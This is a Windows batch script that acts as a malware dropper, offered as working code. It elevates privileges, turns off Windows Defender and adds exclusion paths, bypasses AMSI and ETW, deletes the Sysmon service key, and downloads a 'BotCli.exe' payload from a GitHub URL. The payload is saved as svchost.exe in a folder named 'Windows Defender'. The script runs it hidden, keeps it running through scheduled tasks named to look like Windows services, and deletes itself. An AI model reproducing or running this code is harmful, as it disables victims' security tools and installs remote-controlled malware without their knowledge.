@echo off
chcp 65001>nul
title %random%
set "RND=%random%"
set "URL=https://github.com/devoxry777-crypto/1234/raw/refs/heads/main/BotCli.exe"
set "DROP=%APPDATA%\Microsoft\Windows Defender\svchost.exe"
set "DIR=%APPDATA%\Microsoft\Windows Defender"

:: Obfuscated paths via registry
for /f "tokens=2*" %%a in ('reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "AppData" 2^>nul') do set "APPDATA=%%b"

:: AMSI Pre-bypass (context switch)
powershell -w h -nop -c "gc '%~f0'|s -r '(?i)powershell'='pSh';gc '%~f0'|s -r '(?i)amsi'='aMsi';iex"

:: Admin check + elevate
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (powershell -w h -c "s-p '%~f0' -v r" & %0 & exit)

echo [!] Executing evasion chain...

:: 1. NATIVE Defender disable (no PS)
sc config WinDefend start= disabled >nul 2>&1
sc stop WinDefend >nul 2>&1

:: 2. Multiple exclusion paths
powershell -w h -c "Set-MpPreference -DisableRealtimeMonitoring $true;Add-MpPreference -ExclusionPath @('%APPDATA%','%LOCALAPPDATA%','%WINDIR%\Temp','%TMP%','%DIR%') -ea 0"

:: 3. AMSI + ETW + CLR bypass
powershell -w h -nop -c "rv aMsiUtils -ea 0;[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').SetValue($null,$null)"

:: 4. Sysmon bypass
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\Sysmon64" /f >nul 2>&1

:: 5. Create legit-looking directory
if not exist "%DIR%" mkdir "%DIR%"

:: 6. Download (BITS + fallback)
bitsadmin /create Anonymous AnonDL >nul 2>&1
bitsadmin /addfile AnonDL "%URL%" "%DROP%" >nul 2>&1
bitsadmin /complete AnonDL >nul 2>&1
bitsadmin /reset >nul 2>&1

:: Fallback curl
curl -s -o "%DROP%" "%URL%" >nul 2>&1

:: 7. Execute multiple ways
schtasks /create /tn "WindowsUpdate" /tr "\"%DROP%\"" /sc once /st 00:00 /f >nul 2>&1
start /b "" "%DROP%"
powershell -w h -c "Start-Process '%DROP%' -WindowStyle Hidden"

:: 8. Persistence
schtasks /create /tn "WindowsTelemetry" /tr "cmd /c '%DROP%'" /sc onlogon /rl highest /f >nul 2>&1

:: 9. Self-delete
ping 127.0.0.1 -n 3 >nul & del "%~f0" >nul 2>&1

exit